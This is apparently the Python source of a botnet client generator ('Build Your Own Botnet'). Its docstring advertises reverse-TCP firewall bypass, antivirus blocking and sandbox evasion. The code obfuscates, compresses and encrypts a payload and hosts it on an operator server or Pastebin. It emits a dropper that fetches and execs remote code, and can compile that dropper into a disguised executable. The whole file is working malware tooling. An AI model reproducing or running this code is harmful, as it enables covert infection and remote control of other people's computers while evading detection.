#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Client Generator (Build Your Own Botnet)

Generate clients with the following features:

    - Zero Dependencies
        stager runs with just the python standard library

    - Remote Imports
        remotely import third-party packages from
        the server without downloading/installing them

    - In-Memory Execution Guidline
        clients never write anything to the disk, 
        not even temporary files - zero IO system calls.
        remote imports allow code/scripts/modules to
        be dynamically loaded into memory and directly 
        imported into the currently running process

    - Add Your Own Scripts
        every python script, module, and package in the
        `remote` directory is directl usable by every 
        client at all times while the server is running

    - Unlimited Modules Without Bloating File Size
        use remote imports to add unlimited features without
        adding a single byte to the client's file size 

    - Updatable
        client periodically checks the content available
        for remote import from the server, and will 
        dynamically update its in-memory resources
        if anything has been added/removed

    - Platform Independent
        compatible with PyInstaller and package is authored 
        in Python, a platform agnostic language

    - Bypass Firewall
        connects to server via outgoing connections
        (i.e. reverse TCP payloads) which most firewall
        filters allow by default k

    - Evade Antivirus
        blocks any spawning process
        with names of known antivirus products

    - Prevent Analysis
        main client payload encrypted with a random 
        256-bit key and is only 

    - Avoid Detection
        client will abort execution if a virtual machine
        or sandbox is detected
"""
# standard library
import os
import sys
import imp
import json
import zlib
import struct
import base64
import random
import urllib
import urllib2
import marshal
import logging
import requests
import argparse
import threading
import subprocess

# packages
try:
    import colorama
    colorama.init(autoreset=True)
except: pass

# loading animation
import core.util as util
import core.security as security
import core.generators as generators

# main
def main():
    parser = argparse.ArgumentParser(
        prog='client.py', 
        version='0.1.4',
        description="Client Generator (Build Your Own Botnet)",
    usage="""client.py [-h] [-v] [-n/--name NAME] [-i/--icon ICON]
         [--pastebin API-KEY] [--randomize] [--encrypt]
                 [--obfuscate] [--compress] [--compile]
                 host port [module [module ...]]""")

    parser.add_argument('host',
                        action='store',
                        type=str,
                        help='server IP address')

    parser.add_argument('port',
                        action='store',
                        type=str,
                        help='server port number')

    parser.add_argument('modules',
            metavar='remote imports',
                        action='append',
                        nargs='*',
                        help='modules to remotely import at run-time')

    parser.add_argument('-n','--name',
            action='store',
            help='output file name')

    parser.add_argument('-i','--icon',
            action='store',
            help='icon image file name')

    parser.add_argument('--pastebin',
                        action='store',
            metavar='API',
                        help='upload & host payload on pastebin')

    parser.add_argument('--randomize',
                        action='store_true',
                        default=False,
                        help='randomize file hash by adding junk data')

    parser.add_argument('--encrypt',
                        action='store_true',
                        help='encrypt payload and embed key in stager',
                        default=False)

    parser.add_argument('--obfuscate',
                        action='store_true',
                        help='obfuscate names of classes, functions & variables',
                        default=False)

    parser.add_argument('--compress',
                        action='store_true',
                        help='zip-compress into a self-executing python script',
                        default=False)

    parser.add_argument('--compile',
                        action='store_true',
                        help='compile into a standalone bundled executable',
                        default=False)

    options = parser.parse_args()
    return run(options)

def progress_update(input, output, task=None):
    """ 
    Print a progress update about the code generated
    to the console in color

    `Requires`
    :param str input:      generator input
    :param str output:     generator output

    """
    diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
    util.display("    [+]", color='green', style='bright', end=',')
    util.display(" ".join([task if task else "", "Complete" if len(str(task).split()) <= 1 else ""]), color='reset', style='bright')
    util.display("\t({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')

def run(options):
    """ 
    Generate a client

    `Required`
    :param options:         parsed arguments

    Saves the output file to the ./byob/modules/payloads folder

    """
    key = base64.b64encode(os.urandom(16))
    var = generators.variable(3)
    imports = set()
    hidden_imports = set()

    # modules
    util.display("\n[>]", color='yellow', style='bright', end=',')
    util.display('Modules', color='reset', style='bright')
    modules = ['core/remoteimport.py','core/util.py','core/security.py','core/payload.py']
    for m in modules:
        util.display('    adding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
    if len(options.modules):
        for m in options.modules:
            if isinstance(m, str):
                util.display('\tadding {}...'.format(m), color='reset', style='dim')
                base = os.path.splitext(os.path.basename(m))[0]
                if not os.path.exists(m):
                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        util.display("[-]", color='red', style='dim')
                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='dim')
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                modules.append(module)

    # imports
    util.display("\n[>]", color='yellow', style='bright', end=',')
    util.display("Imports", color='reset', style='bright')
    for module in modules:
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                        if x in line:
                            break
                    else:
                        imports.add(line.strip())
                        for i in line.split()[1].split(';')[0].split(','):
                            i = line.split()[1] if i == '*' else i
                            hidden_imports.add(i)
                            util.display('\tadding {}...'.format(i), color='reset', style='dim')
                elif len(line.split()) > 3:
                    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
                        for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                            if x in line.strip():
                                break
                        else:
                            imports.add(line.strip())
                            for i in str().join(line.split()[3:]).split(';')[0].split(','):
                                i = line.split()[1] if i == '*' else i
                                hidden_imports.add(i)
                                util.display('\tadding {}...'.format(i), color='reset', style='dim')
                else:
                    pass

    imports = list(imports)
    hidden_imports = list(hidden_imports)
    util.display("    [+]", color='green', style='bright', end=',')
    util.display("{} Imports Complete".format(len(list(imports))), color='reset', style='dim')
                 
    # payload
    util.display("\n[>]", color='yellow', style='bright', end=',')
    util.display("Payload", color='reset', style='dim')
    payload = '\n'.join(list(imports) + [open(module,'r').read().partition('# main')[2] for module in modules]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'

    if options.obfuscate:
        __load__= threading.Event()
        util.display("\n    Obfuscating payload...", color='reset', style='dim', end=',')
        __spin__= util.spinner(__load__)
        output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
        __load__.set()
        progress_update(payload, output, task='Obfuscation')
        payload = output

    if options.compress:
        util.display("\n    Compressing payload... ", color='reset', style='dim', end=',')
        output = generators.compress(payload)
        progress_update(payload, output, task='Compression')
        payload = output

    if options.encrypt:
        util.display("\n    Encrypting payload... ".format(key), color='reset', style='dim', end=',')
        output = generators.encrypt(payload, key)
        progress_update(payload, output, task='Encryption')
        payload = output

    # upload
    util.display("\n    Uploading payload... ", color='reset', style='dim', end=',')
    if options.pastebin:
        url = util.pastebin(payload, api_dev_key=options.pastebin)
    else:
        dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d
        path = os.path.join(os.path.abspath(dirname), var + '.py' )
        with file(path, 'w') as fp:
            fp.write(payload)
        s = 'http://{}:{}/{}/'.format(options.host, options.port, urllib.pathname2url(path.strip(os.path.join(os.getcwd(), 'modules'))))
        s = urllib2.urlparse.urlsplit(s)
        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/').replace('//payloads','/payloads')
        if url.endswith('.p'):
            url += 'y'

    util.display("    [+]", color='green', style='bright', end=',')
    util.display("Upload Complete", color='reset', style='bright')
    util.display("\t(hosting payload at: {}".format(url), color='reset', style='dim')

    # stager
    util.display("\n[>]", color='yellow', style='bright', end=',')
    util.display("Stager", color='reset', style='dim')
    stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=url, key=key)

    if options.obfuscate:
        util.display("\n    Obfuscating stager... ", color='reset', style='dim', end=',')
        output = generators.obfuscate(stager)
        progress_update(stager, output, task='Obfuscation')
        stager = output

    if options.compress:
        util.display("\n    Compressing stager... ", color='reset', style='dim', end=',')
        output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
        progress_update(stager, output, task='Compression')
        stager = output

    util.display("\n    Uploading stager... ", color='reset', style='dim', end=',')
    if options.pastebin:
        url2 = util.pastebin(stager, api_dev_key=options.pastebin)
    else:
        dirs2 = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
        dirname2 = '.'
        for d2 in dirs2:
            if os.path.isdir(d2):
                dirname2 = d2
        path2 = os.path.join(os.path.abspath(dirname2), var + '.py' )
        with file(path2, 'w') as fp:
            fp.write(stager)
        s2 = 'http://{}:{}/{}/'.format(options.host, int(options.port) + 1, urllib.pathname2url(path2.strip(os.path.join(os.getcwd(), 'modules'))))
        s2 = urllib2.urlparse.urlsplit(s2)
        url2 = urllib2.urlparse.urlunsplit((s2.scheme, s2.netloc, os.path.normpath(s2.path), s2.query, s2.fragment)).replace('\\','/').replace('//tagers','/stagers')
        if url2.endswith('.p'):
            url2 += 'y'

    util.display("    [+]", color='green', style='bright', end=',')
    util.display("Upload Complete", color='reset', style='bright')
    util.display("\t(hosting stager at: {}".format(url2), color='reset', style='dim')

    # dropper
    util.display("\n[>]", color='yellow', style='bright', end=',')
    util.display("Dropper", color='reset', style='bright')
    name = 'byob_{}.py'.format(var) if not options.name else options.name
    if not name.endswith('.py'):
        name += '.py'
    dropper = "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(url2)))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(url2)))))))
    with file(name, 'w') as fp:
        fp.write(dropper)

    if options.compile:
        util.display('\n    Compiling dropper...', color='reset', style='dim', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        if sys.platform == 'darwin':
            name = generators.app(name, icon=options.icon)
        else:
            name = generators.exe(name, icon=options.icon, hidden_imports=hidden_imports)
        __load__.set()
        util.display("\n    [+]", color='green', style='bright', end=',')
        util.display("Compiled Dropper Complete", color='reset', style='bright')
    util.display("\t(saved to file: {})".format(name).ljust(80 - len("    [+]")), style='dim', color='reset')
    return name

if __name__ == '__main__':
    main()
